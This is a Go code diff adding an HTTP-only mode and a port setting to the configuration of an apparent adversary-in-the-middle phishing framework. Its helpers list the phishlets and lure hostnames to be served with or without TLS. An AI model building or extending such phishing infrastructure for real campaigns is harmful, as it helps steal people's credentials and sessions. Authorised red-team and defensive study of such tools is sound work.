@@ -41,6 +41,7 @@ type PhishletConfig struct {
 	UnauthUrl string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
 	Enabled   bool   `mapstructure:"enabled" json:"enabled" yaml:"enabled"`
 	Visible   bool   `mapstructure:"visible" json:"visible" yaml:"visible"`
+	HttpMode  bool   `mapstructure:"http_mode" json:"http_mode" yaml:"http_mode"` // true = phishing server listens on HTTP (no TLS), false = HTTPS (default)
 }
 
 type ProxyConfig struct {
@@ -72,6 +73,7 @@ type GeneralConfig struct {
 	BindIpv4     string `mapstructure:"bind_ipv4" json:"bind_ipv4" yaml:"bind_ipv4"`
 	UnauthUrl    string `mapstructure:"unauth_url" json:"unauth_url" yaml:"unauth_url"`
 	HttpsPort    int    `mapstructure:"https_port" json:"https_port" yaml:"https_port"`
+	HttpPort     int    `mapstructure:"http_port" json:"http_port" yaml:"http_port"` // Port for HTTP-only phishing (default: 80)
 	DnsPort      int    `mapstructure:"dns_port" json:"dns_port" yaml:"dns_port"`
 	Autocert     bool   `mapstructure:"autocert" json:"autocert" yaml:"autocert"`
 }
@@ -169,6 +171,9 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	}
 	if c.general.HttpsPort == 0 {
 		c.SetHttpsPort(443)
+	}
+	if c.general.HttpPort == 0 {
+		c.SetHttpPort(80)
 	}
 	if c.general.DnsPort == 0 {
 		c.SetDnsPort(53)
@@ -292,6 +297,13 @@ func (c *Config) SetHttpsPort(port int) {
 	c.general.HttpsPort = port
 	c.cfg.Set(CFG_GENERAL, c.general)
 	log.Info("https port set to: %d", port)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) SetHttpPort(port int) {
+	c.general.HttpPort = port
+	c.cfg.Set(CFG_GENERAL, c.general)
+	log.Info("http port set to: %d", port)
 	c.cfg.WriteConfig()
 }
 
@@ -459,6 +471,47 @@ func (c *Config) IsSiteHidden(site string) bool {
 	return !c.PhishletConfig(site).Visible
 }
 
+func (c *Config) SetPhishletHttpMode(site string, enabled bool) error {
+	if _, err := c.GetPhishlet(site); err != nil {
+		log.Error("%v", err)
+		return err
+	}
+	c.PhishletConfig(site).HttpMode = enabled
+	if enabled {
+		log.Info("phishlet '%s' http_mode enabled (phishing server will use HTTP, no TLS)", site)
+	} else {
+		log.Info("phishlet '%s' http_mode disabled (phishing server will use HTTPS)", site)
+	}
+	c.SavePhishlets()
+	return nil
+}
+
+func (c *Config) IsPhishletHttpModeEnabled(site string) bool {
+	return c.PhishletConfig(site).HttpMode
+}
+
+// GetHttpModeEnabledSites returns list of phishlets that have http_mode enabled
+func (c *Config) GetHttpModeEnabledSites() []string {
+	var sites []string
+	for k, o := range c.phishletConfig {
+		if o.Enabled && o.HttpMode {
+			sites = append(sites, k)
+		}
+	}
+	return sites
+}
+
+// GetHttpsModeEnabledSites returns list of phishlets that have http_mode disabled (use HTTPS)
+func (c *Config) GetHttpsModeEnabledSites() []string {
+	var sites []string
+	for k, o := range c.phishletConfig {
+		if o.Enabled && !o.HttpMode {
+			sites = append(sites, k)
+		}
+	}
+	return sites
+}
+
 func (c *Config) GetEnabledSites() []string {
 	var sites []string
 	for k, o := range c.phishletConfig {
@@ -540,6 +593,77 @@ func (c *Config) GetActiveHostnames(site string) []string {
 		}
 	}
 	return ret
+}
+
+// GetActiveHttpsHostnames returns active hostnames for phishlets that are NOT in http_mode (use HTTPS)
+func (c *Config) GetActiveHttpsHostnames(site string) []string {
+	var ret []string
+	sites := c.GetHttpsModeEnabledSites()
+	for _, _site := range sites {
+		if site == "" || _site == site {
+			pl, err := c.GetPhishlet(_site)
+			if err != nil {
+				continue
+			}
+			for _, host := range pl.GetPhishHosts(false) {
+				ret = append(ret, strings.ToLower(host))
+			}
+		}
+	}
+	for _, l := range c.lures {
+		if site == "" || l.Phishlet == site {
+			if c.IsSiteEnabled(l.Phishlet) && !c.IsPhishletHttpModeEnabled(l.Phishlet) {
+				if l.Hostname != "" {
+					hostname := strings.ToLower(l.Hostname)
+					ret = append(ret, hostname)
+				}
+			}
+		}
+	}
+	return ret
+}
+
+// GetActiveHttpHostnames returns active hostnames for phishlets that ARE in http_mode
+func (c *Config) GetActiveHttpHostnames(site string) []string {
+	var ret []string
+	sites := c.GetHttpModeEnabledSites()
+	for _, _site := range sites {
+		if site == "" || _site == site {
+			pl, err := c.GetPhishlet(_site)
+			if err != nil {
+				continue
+			}
+			for _, host := range pl.GetPhishHosts(false) {
+				ret = append(ret, strings.ToLower(host))
+			}
+		}
+	}
+	for _, l := range c.lures {
+		if site == "" || l.Phishlet == site {
+			if c.IsSiteEnabled(l.Phishlet) && c.IsPhishletHttpModeEnabled(l.Phishlet) {
+				if l.Hostname != "" {
+					hostname := strings.ToLower(l.Hostname)
+					ret = append(ret, hostname)
+				}
+			}
+		}
+	}
+	return ret
+}
+
+// IsActiveHttpHostname checks if the hostname is active and in HTTP mode
+func (c *Config) IsActiveHttpHostname(host string) bool {
+	host = strings.ToLower(host)
+	if host[len(host)-1:] == "." {
+		host = host[:len(host)-1]
+	}
+	httpHosts := c.GetActiveHttpHostnames("")
+	for _, h := range httpHosts {
+		if h == host {
+			return true
+		}
+	}
+	return false
 }
 
 func (c *Config) IsActiveHostname(host string) bool {
@@ -794,6 +918,10 @@ func (c *Config) GetServerBindIP() string {
 
 func (c *Config) GetHttpsPort() int {
 	return c.general.HttpsPort
+}
+
+func (c *Config) GetHttpPort() int {
+	return c.general.HttpPort
 }
 
 func (c *Config) GetDnsPort() int {
